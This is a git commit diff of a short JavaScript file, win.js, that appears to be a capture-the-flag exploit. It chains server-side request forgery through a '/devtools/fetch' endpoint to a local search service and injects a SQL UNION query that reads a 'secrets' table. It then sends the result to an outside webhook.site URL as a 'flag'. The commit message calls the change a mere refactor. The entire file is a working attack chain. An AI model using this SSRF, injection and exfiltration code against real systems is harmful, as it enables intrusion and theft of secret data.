dd4bf8314f6c8bf04b6f50fcbad230db4e1c81e1
bahylol <94308278+bahylol@users.noreply.github.com>
2026-04-19 18:18:09 +0200

    Refactor fetch request to use JSON format
    Updated the fetch call to use JSON and encode the URL properly.

--- win.js
+++ win.js
@@ -1,8 +1,11 @@
-u='http://127.0.0.1:8080/search?q='%20UnIoN%20SeLeCt%201,secret,3,4%20FrOm%20secrets';
-fetch('/devtools/fetch',{
- method:'POST',
- credentials:'include',
- body:'{"url":"'+u+'"}'
+u='http://127.0.0.1:8080/search?q=' + encodeURIComponent("' UnIoN SeLeCt 1,secret,3,4 FrOm secrets--");
+fetch('/devtools/fetch', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  credentials: 'include',
+  body: JSON.stringify({url: u})
 })
-.then(r=>r.text())
-.then(x=>location='https://webhook.site/8c62b06e-fc89-4a48-b546-c925fe959850?d='+encodeURIComponent(x))
+.then(r => r.json())
+.then(d => {
+  fetch('https://webhook.site/8c62b06e-fc89-4a48-b546-c925fe959850?flag=' + encodeURIComponent(d.body));
+});
